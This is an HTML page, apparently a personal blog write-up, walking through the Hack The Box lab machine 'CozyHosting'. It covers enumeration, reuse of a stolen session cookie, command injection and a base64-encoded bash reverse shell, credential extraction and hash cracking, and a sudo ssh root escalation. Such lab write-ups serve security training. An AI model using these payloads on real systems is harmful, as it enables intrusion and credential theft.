@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width" initial-scale="1.0">
+        <title>CozyHosting</title>
+        <link rel="stylesheet" href="style3.css">
+    </head>
+    <body>
+        <div class="header-content">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsftl35uZBV9wYNE66Qv44yHgWsTC3ugTLxw&s" alt="Logo" class="logo">
+            <h1>Cozyhosting Reportings</h1>
+            </div>
+            <hr>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*m1S-kcO3eFj4mbIl.png">
+            <p class="paragraph">
+                Summary: Linux system that is hosting a Spring Boot Web Application. Utilizing simple enumeration techniques, a valid user cookie<br>is exposed enabling an attacker to gain access to an admin dashboard that contains a command injection vulnerability. From this<br>vulnerability an attacker is able to gain remote access to the target. The attacker is then able to find plain text credentials within the web application framework to a database leading<br>to the collection and cracking of hashes to database users. The credentials gained from cracking allows the attacker to masquerade as a legit<br>user and take advantage of a sudo configuration that give the attacker root level permissions.<br><br>
+                MITRE ATT&CK Techniques:<br><br>
+                T1595 — Active Scanning<br><br>
+                T1539 — Steal Web Session Cookie<br><br>
+                T1059.004 — Command and Scripting Interpreter: Unix Shell<br><br>
+                T1552 — Unsecured Credentials<br><br>
+                T1110.002 — Brute Force: Password Cracking<br><br>
+                T1548 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching<br><br>
+                So lets begin the game,
+            </p>
+            <h2>Enumeration</h2>
+            <p class="paragraph">
+                Lets start with port scanning of machine using NMAP:
+                <p class="script-container">
+                    nmap -A -sC -sV -O 10.10.11.230 -T4 -Pn
+                </p>
+                <p class="script-container">
+                    Nmap scan report for cozyhosting.htb (10.10.11.230)<br>
+                    Host is up (0.59s latency).<br>
+                    Not shown: 997 closed tcp ports (reset)<br>
+                    PORT     STATE SERVICE VERSION<br>
+                    22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>
+                    | ssh-hostkey: <br>
+                    |   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)<br>
+                    |_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)<br>
+                    80/tcp   open  http    nginx 1.18.0 (Ubuntu)<br>
+                    |_http-server-header: nginx/1.18.0 (Ubuntu)<br><br>
+
+                    Network Distance: 2 hops<br>
+                    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>
+
+                    TRACEROUTE (using port 995/tcp)<br>
+                    HOP RTT       ADDRESS<br>
+                    1   364.46 ms 10.10.14.1<Br>
+                    2   555.36 ms cozyhosting.htb (10.10.11.230)<br><br>
+
+                    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>
+                    Nmap done: 1 IP address (1 host up) scanned in 99.08 seconds<br>
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ILpyfIy8vIKOkpNg2mXWqA.png">
+            <p class="paragraph">
+                After the nmap scan, we discovered two open ports on the machine. Next, we should add the IP address to the /etc/hosts file and then access cozyhosting.htb.<br><br>
+                Analyzing the SSH Banner (OpenSSH 8.9p1 Ubuntu 3ubuntu0.3), the attacker can infer that the target is<br>likely running a version of the Ubuntu Linux distribution. By combining the SSH banner information with the launchpad<br>web resource, the attacker can further narrow down the exact release of the operating system.<br><br>
+                This part of the attack relates to MITRE ATT&CK Technique T1595 — Active Scanning. Removing SSH banners<br>is a simple task that can enhance an organization’s security by adding a small layer of protection.
+            </p>
+            <h3>Enumerating Web (Port 80)</h3>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/0*He29kzOVj1YtXBXQ.png">
+            <p class="paragraph">
+                Moving on to the HTTP protocol, let’s scans the HTTP web service with a wordlist looking for directories<br>that may not be seen with browsing the site.
+                <p class="script-container">
+                    dirsearch -u http://cozyhosting.htb
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*OMGoksLm59HVCDS1a0DDVA.png">
+            <p class="paragraph">
+                During this directory fuzzing, while going through the endpoints, we find a directory which contains<br>JESSIONIDs of the users. (/actuators/sessions)
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*JoJDunEmTRPygZCfyMd3Ng.png">
+            <p class="paragraph">
+                So we tried to logged in by replacing our JESSIONID with this JESSIONIDs in Burp Suite, (Hint: You can<br>use Replace feature in request to autoreplace the cookie with the new value, if you don’t replace JSESSIONID in every<br>request, you’ll be logged out), once you replace it, you’ll be logged in!
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*6ic4xPkpzV4OpOE5-3ukkQ.png">
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*6k9phBqoicFUj0zPiUZIVw.png">
+            <p class="paragraph">
+                Now, on this dashboard we find that there was a functionality running which serves an ssh connection to it’s users.
+            </p> 
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*wNsB-MiJdqdAoKw_I7XKOw.png">
+            <p class="paragraph">
+                After giving random hostname & username , we captured the request in BurpSuite. Then we tried to send the<br>request (using Burp Repeater) without giving the username & it responds as a ssh command help section.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*LD7T_Sw5AQTOoI-yHYZGXg.png">
+            <p class="paragraph">
+                And this is the response to the request above!
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*D637-QdSIXFj9euKKXji5Q.png">
+            <p class="paragraph">
+                This shows that it’s sort of ssh command usage, lets try few more things.<br><br>
+                Using ‘sudo -l’ to list allowed and forbidden commands for the user ‘josh,’ we discovered that ‘josh’ can run<br>the following command on localhost: ‘(root) /usr/bin/ssh *,’ granting root privileges.After that, we tried to<br>send the username with single quote (test’) & its shows that there was an error created during the “/bin/bash -c “ execution process.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*AnSpA3fzWmG1zbpn1uxXFA.png">
+            <p class="paragraph">
+                Defense: SELinux contexts are effective in preventing programs from executing within the /tmp directory, especially<br>those that rely on sockets.<br><br>
+                Injecting commands using the HTML POST protocol resembles the MITRE ATT&CK Technique T1059.004 — Command and Scripting<br>Interpreter: Unix Shell<br><br>
+                Lets try a simple ping command back to the attacker’s machine. Looks like the attacker can ping the attacker machine from<br>the target using command injection by entering the following in the username field.
+                <p class="script-container">
+                    ;ping${IFS}-c4${IFS}10.10.14.80;#
+                </p>
+                The ${IFS} is the equivalent to a white space character.<br><br>
+                Lets try making our own payload which will give an reverse shell while executed by the machine or You can use any of the<br>reverse-ssh payload available on the Internet.
+                <p class="script-container">
+                    echo "bash -i >& /dev/tcp/your-ip 0>&1" | base64 -w 0
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e-3OyAlLCiYcb3n1FENuSg.png">
+            <p class="paragraph">
+                Use the created payload in the reverse shell payload and pass it to parameter. What it does, it decodes the base64 shell<br>code and pass it to the bash in the server. ($IFS%?? is the equal to white space character).
+                <p class="script-container">
+                    ;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+                </p>
+                We’ll send this payload as the username with URL encoded & started a listener on our machine.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*M55t9tGZtHzUqRuhOTQEVQ.png">
+            <p class="paragraph">
+                After encoding it into url and sending a request
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*oWmdAtY7a5-Vv6yjgITQdw.png">
+            <p class="paragraph">
+                Once, we set up netcat listener with the IP address and port we used in payload, we are good to go to send the request and get a shell!
+                <p class="script-container">
+                    nc -nvlp "yourgivenip"
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*yYPcusK9deEAENsDXoZZnQ.png">
+            <p class="paragraph">
+                Now it’s time to make this shell stable !!
+                <p class="script-container">
+                    python3 -c 'import pty;pty.spawn("/bin/bash")'
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*oY47WKQdfjNSvQ0LfMpeyQ.png">
+            <p class="paragraph">
+                Here on this shell we got a something.tar file8.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*blIQNvpatP6lCFWbkXEYUg.png">
+            <p class="paragraph">
+                The Spring Boot web application is contained within the /app/cloudhosting-0.0.1.jar file.<br><br>
+                Lets fetch the file to our device, to extract and see what’s inside. Fetching file, will be done using<br>creating server using python and then downloading using wget into our system. (If you are completely new to this,<br>server is created in the victim’s machine)
+                <p class="script-container">
+                    python3 -m http.server 1111
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZGKRDPEbJkdbXsqcyjhOKQ.png">
+            <p class="script-container">
+                wget http://10.10.11.230:1111/file_name
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*it-tMbfVCpjYNZNqREcWOg.png">
+            <p class="paragraph">
+                There after, we opened this file using ‘jd-gui’ & got the PostgreSQL database’s username & password.<br><br>
+                JD-GUI is a standalone graphical utility that displays Java source codes of “.class” files. You can browse<br>the reconstructed source code with the JD-GUI for instant access to methods and fields.
+                <p class="script-container">
+                    jd-gui file_name
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Yku-XEH0AULn71F09oiwBA.png">
+            <p class="paragraph">
+                We successfully logged into the PostgreSQL database using these username & password.<br><br>
+                Finding plaintext password on a comprimised system is a MITRE ATT&CK Technique T1552 — Unsecured Credentials
+                <p class="script-container">
+                    psql -h 127.0.0.1 -U postgres
+                </p>
+                <p class="script-container">
+                    \c cozyhosting
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*fRHTXF1CzWIkM90wJ_3LBA.png">
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*3km7PqghZVcgPmfzRn29oA.png">
+            <p class="paragraph">
+                \c is used to connect to specific database in our case, its Cozyhosting<br><br>
+                Here we got a hash-value of the password .<br><br>
+                \d is used to see all the tables in the database.
+                <p class="script-container">
+                    \d<br>
+                    select * from users;
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*7yIWol7hyUOtv9e35tTM3A.png">
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*30oh3CjCXN3ULhTS79dR0Q.png">
+            <p class="paragraph">
+                This attack technique is part of the MITRE ATT&K Framework T1110.002 — Brute Force: Password Cracking<br><br>
+                Lets crack the password using john-the ripper!!
+                <p class="script-container">
+                    john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*MRLh7POryMyREb45pfhVwQ.png">
+            <p class="paragraph">
+                We also find a user named ‘josh’ in /etc/passwd !!
+                <p class="script-container">
+                    cat /etc/passwd
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*2BFpG35i1XkeVCB5_AfGKw.png">
+            <p class="paragraph">
+                Now using this username & password we successfully get the ssh shell & user flag .
+                <p class="script-container">
+                    ssh josh@10.10.11.230<br>
+                    ssh josh@cozyhosting.htb
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*20k5CieDXA7kJO7XCFBvRA.png">
+            <img src="https://miro.medium.com/v2/resize:fit:596/format:webp/1*w_GjC9YQHPRAunuoqaefeg.png">
+            <h2>Privilege Escalation</h2>
+            <p class="paragraph">
+                Using ‘sudo -l’ to list allowed and forbidden commands for the user ‘josh,’ we discovered that ‘josh’ can<br>run the following command on localhost: ‘(root) /usr/bin/ssh *,’ granting root privileges.<br><br>
+                Abusing SUDO to perform privilege escalation is part of the MITRE ATT&CK Technique T1548 — Abuse Elevation<br>Control Mechanism: Sudo and Sudo Caching.<br><br>
+                Defensive: Only allow sudo privileges to users with a critical need and research the command that is being<br>granted root level privileges for vulnerabilities<br>or privilege escalation techniques.
+                <p class="script-container">
+                    sudo -l
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Iv1inxNWqvYtuDGCAt4O1g.png">
+            <p class="paragraph">
+                There was a simple payload at GTFOBINS which succesfully allows us to get the shell as the superuser(root).<br><br>
+                Payload : https://gtfobins.github.io/gtfobins/ssh/#sudo
+                <p class="script-container">
+                    sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ul3XLopPDYihQMWPfCbGAg.png">
+            <p class="paragraph">
+                Finally we have obtained the user and root flag of the machine.!!
+            </p>
+    </body>
+    <footer class="footer">
+        <p>&copy; 2024 <a href="https://Iam.Gh0st.Net">Iam.Gh0st.net</a> All rights reserved.</p>
+    </footer>
+</html>
